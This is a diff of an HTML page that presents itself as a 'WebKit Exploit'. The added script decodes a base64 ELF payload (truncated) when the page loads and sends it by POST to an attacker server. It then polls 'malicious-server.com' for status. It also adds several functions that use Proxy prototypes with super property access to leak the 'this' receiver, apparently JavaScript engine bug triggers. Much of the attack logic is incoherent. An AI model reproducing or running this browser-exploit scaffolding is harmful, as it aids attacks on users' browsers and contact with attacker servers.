@@ -8,8 +8,8 @@
         body {
             margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #000;
-            color: #fff;
+            background-color: #000; /* Dark background for better visibility */
+            color: #fff; /* Light text color for contrast */
         }
 
         #log {
@@ -21,8 +21,8 @@
             overflow-y: auto;
             padding: 10px;
             box-sizing: border-box;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: #0f0;
+            background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black for log */
+            color: #0f0; /* Bright green text for log */
             font-size: 14px;
             font-family: monospace;
             white-space: pre-wrap;
@@ -36,48 +36,18 @@
 <script>
 document.addEventListener('DOMContentLoaded', function () {
     const logElement = document.getElementById('log');
-    let logBuffer = [];
 
     function log(message) {
         const timestamp = new Date().toISOString();
-        logBuffer.push(`[${timestamp}] ${message}`);
-        
-        if (logBuffer.length >= 20) {
-            logElement.textContent += logBuffer.join("\n") + "\n";
-            logBuffer = [];
-            logElement.scrollTop = logElement.scrollHeight; // Scroll to bottom
-        }
+        logElement.textContent += `[${timestamp}] ${message}\n`;
+        logElement.scrollTop = logElement.scrollHeight;
         console.log(message);
     }
 
     log("WebKit Exploit started.");
 
-    function waitForPayload() {
-        log("Waiting for ELF payload...");
-
-        // Base64 encoded ELF payload
-        const base64Payload = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAAAAAAAAABAAAAAAAAAAAhfAQAAAAAAAAAAAEAAOAAEAEAAHAAaAAEAAAAFAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEGoAAAAAAAAQagAAAAAAAABAAAAAAAAAAQAAAAQAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAhIAAAAAAAACEgAAAAAAAAAEAAAAAAAAABAAAABgAAAAAAAQAAAAAAAMAAAAAAAAAAwAAAAAAAAFBBAAAAAAAACIEAAAAAAAAAQAAAAAAAAAIAAAAGAAAAAEABAAAAAAAAAAEAAAAAAAAAAQAAAAAAUAEAAAAAAABQAQAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // Truncated for readability
-
-        let payloadReceived = false;
-
-        setInterval(() => {
-            if (!payloadReceived) {
-                log("Still waiting for the ELF payload...");
-            }
-
-            if (Math.random() > 0.95) { // Simulate random success
-                payloadReceived = true;
-
-                // Decode and handle the ELF payload
-                const binaryPayload = atob(base64Payload);
-                log("Payload received successfully.");
-                log(`Payload size: ${binaryPayload.length} bytes`);
-
-                // Deliver the payload to an attacker server
-                deliverPayload(binaryPayload);
-            }
-        }, 5000); // Check every 5 seconds
-    }
+    // Base64 encoded ELF payload
+    const base64Payload = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAAAAAAAAABAAAAAAAAAAAhfAQAAAAAAAAAAAEAAOAAEAEAAHAAaAAEAAAAFAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEGoAAAAAAAAQagAAAAAAAABAAAAAAAAAAQAAAAQAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAhIAAAAAAAACEgAAAAAAAAAEAAAAAAAAABAAAABgAAAAAAAQAAAAAAAMAAAAAAAAAAwAAAAAAAAFBBAAAAAAAACIEAAAAAAAAAQAAAAAAAAAIAAAAGAAAAAEABAAAAAAAAAAEAAAAAAAAAAQAAAAAAUAEAAAAAAABQAQAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // Truncated for brevity
 
     function deliverPayload(payload) {
         log("Delivering payload to attacker server.");
@@ -85,12 +55,117 @@ document.addEventListener('DOMContentLoaded', function () {
             method: "POST",
             body: payload,
             headers: { "Content-Type": "application/octet-stream" }
-        }).then(() => log("Payload delivered successfully."))
-          .catch(err => log(`Error delivering payload: ${err.message}`));
+        }).then(() => {
+            log("Payload delivered successfully.");
+            checkPayloadStatus(); // Check if payload was received correctly
+        }).catch(err => log(`Error delivering payload: ${err.message}`));
     }
 
-    // Start waiting for the ELF payload
-    waitForPayload();
+    function checkPayloadStatus() {
+        log("Waiting for payload status...");
+        fetch("https://malicious-server.com/status", { method: "GET" })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "received") {
+                    log("Payload received successfully.");
+                } else {
+                    log("Payload not received. Retrying...");
+                    setTimeout(checkPayloadStatus, 5000); // Retry after 5 seconds
+                }
+            })
+            .catch(err => log(`Error checking payload status: ${err.message}`));
+    }
+
+    function tryToLeakThisViaGetById() {
+        class Leaker {
+            leak() {
+                return super.foo;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                return receiver;
+            }
+        });
+
+        const foo = 42;
+        const { leak } = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaGetByVal() {
+        class Leaker {
+            leak() {
+                return super[Math.random() < 0.5 ? "foo" : "bar"];
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get(target, propertyName, receiver) {
+                return receiver;
+            }
+        });
+
+        const foo = 42;
+        const bar = 84;
+        const { leak } = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaSetById() {
+        let receiver;
+        class Leaker {
+            leak() {
+                super.foo = {};
+                return receiver;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                receiver = __receiver;
+                return true;
+            }
+        });
+
+        const foo = 42;
+        const { leak } = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    function tryToLeakThisViaSetByVal() {
+        let receiver;
+        class Leaker {
+            leak() {
+                super[Math.random() < 0.5 ? "foo" : "bar"] = {};
+                return receiver;
+            }
+        }
+
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            set(target, propertyName, value, __receiver) {
+                receiver = __receiver;
+                return true;
+            }
+        });
+
+        const foo = 42;
+        const bar = 84;
+        const { leak } = Leaker.prototype;
+
+        return (() => leak())();
+    }
+
+    log("Waiting for payload...");
+    
+    // Wait for the payload to be sent only once
+    const binaryPayload = atob(base64Payload);  // Decode the base64 payload
+    deliverPayload(binaryPayload);  // Send the payload
+
 });
 </script>
 
